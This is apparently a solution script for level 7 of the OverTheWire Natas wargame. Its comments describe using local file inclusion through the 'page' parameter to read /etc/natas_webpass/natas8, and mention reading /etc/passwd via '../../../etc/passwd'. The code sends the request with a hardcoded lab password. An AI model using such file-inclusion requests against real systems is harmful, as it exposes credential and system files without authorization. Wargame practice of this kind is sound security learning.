import requests
import re

"""
Explanantion:
In the source code, we get a hint:
<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
The hint is referencing a directory so and there were get requests using the page parameter so I decided to do some local file inclusion on the page paramater.
And that's how I met the password kids.

Fun fact: You can also see this site's /etc/passwd file using ../../../etc/passwd as the page parameter
"""

# Authentication
username = "natas7"
password = "7z3hEENjQtflzgnT29q7wAvMNfZdh0i9"

# URL
url = f"http://{username}.natas.labs.overthewire.org?page=/etc/natas_webpass/natas8"

response = requests.get(url, auth=(username, password))
content = response.text

print(re.findall("<br>\n(.*)\n\n<!--", content)[0])